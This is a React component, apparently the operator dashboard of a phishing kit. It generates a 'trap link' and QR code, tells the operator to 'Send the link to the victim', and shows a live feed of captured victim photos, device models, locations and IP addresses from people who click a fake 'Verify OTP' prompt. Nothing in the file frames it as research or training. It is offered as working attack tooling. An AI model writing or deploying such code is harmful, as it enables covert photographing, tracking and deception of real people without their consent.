import { useEffect, useState } from 'react';
import { supabase } from '../utils/supabase';
import QRCode from 'qrcode.react';
import { motion } from 'framer-motion';

const Dashboard = () => {
  const [uniqueId, setUniqueId] = useState(null);
  const [captures, setCaptures] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Get User Profile
    const fetchProfile = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) {
        const { data } = await supabase.from('profiles').select('*').eq('id', user.id).single();
        setUniqueId(data.unique_id);
      }
    };

    // Fetch Initial Data & Listen for Realtime Updates
    const fetchAndListen = async () => {
      setLoading(true);
      
      // 1. Get existing data
      const { data: existing } = await supabase
        .from('captures')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (existing) setCaptures(existing);

      // 2. Subscribe to new rows
      const channel = supabase
        .channel('captures_channel')
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'captures' }, (payload) => {
          setCaptures((prev) => [payload.new, ...prev]);
        })
        .subscribe();

      fetchProfile();
      setLoading(false);
    };

    fetchAndListen();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  if (loading) return <div className="p-10 text-center">Loading Dashboard...</div>;

  const baseUrl = window.location.origin;
  const trapLink = `${baseUrl}/hack/${uniqueId}`;

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6 font-sans">
      <header className="mb-10 flex justify-between items-center">
        <h1 className="text-3xl font-bold text-green-400">Live Phishing Dashboard</h1>
        <div className="bg-gray-800 px-4 py-2 rounded-lg border border-gray-700">
          ID: <span className="font-mono text-yellow-400">{uniqueId}</span>
        </div>
      </header>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
        
        {/* Left Column: Link Generator */}
        <div className="md:col-span-1 space-y-6">
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="bg-gray-800 p-6 rounded-xl border border-gray-700"
          >
            <h2 className="text-xl font-semibold mb-4">Your Trap Link</h2>
            <div className="bg-black p-4 rounded-lg break-all text-xs text-gray-300 font-mono mb-4">
              {trapLink}
            </div>
            
            <div className="flex justify-center bg-white p-4 rounded-xl w-max mx-auto">
              <QRCode value={trapLink} size={128} />
            </div>
            <p className="text-xs text-gray-500 mt-2 text-center">Scan to test the trap</p>
          </motion.div>

          <div className="bg-blue-900/30 p-4 rounded-xl border border-blue-800">
            <h3 className="font-bold text-blue-300 mb-2">Instructions</h3>
            <ol className="list-decimal list-inside text-sm space-y-1 text-gray-300">
              <li>Send the link to the victim.</li>
              <li>They click "Verify OTP".</li>
              <li>Their photo appears here instantly.</li>
            </ol>
          </div>
        </div>

        {/* Right Column: Live Feed */}
        <div className="md:col-span-2">
          <h2 className="text-xl font-semibold mb-4 flex items-center gap-2">
            <span className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></span>
            Live Captures ({captures.length})
          </h2>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {captures.map((capture) => (
              <motion.div 
                key={capture.id}
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-gray-800 rounded-xl overflow-hidden border border-gray-700 shadow-lg"
              >
                <div className="h-48 bg-black relative">
                  <img src={capture.image_url} alt="Victim" className="w-full h-full object-cover" />
                  <div className="absolute top-2 right-2 bg-red-600 text-white text-[10px] px-2 py-1 rounded">LIVE</div>
                </div>
                
                <div className="p-4">
                  <div className="flex justify-between items-start mb-2">
                    <div>
                      <p className="text-xs text-gray-400 uppercase tracking-wider">Device</p>
                      <p className="font-bold text-sm">{capture.device_model}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-gray-400 uppercase tracking-wider">Location</p>
                      <p className="font-bold text-sm">{capture.location_city}, {capture.location_country}</p>
                    </div>
                  </div>
                  
                  <div className="mt-3 pt-3 border-t border-gray-700 flex items-center gap-2 text-xs text-gray-500">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    IP: {capture.ip_address}
                  </div>
                </div>
              </motion.div>
            ))}

            {captures.length === 0 && (
              <div className="col-span-2 h-64 flex items-center justify-center text-gray-500 border-2 border-dashed border-gray-700 rounded-xl">
                Waiting for victim to verify...
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
};

export default Dashboard;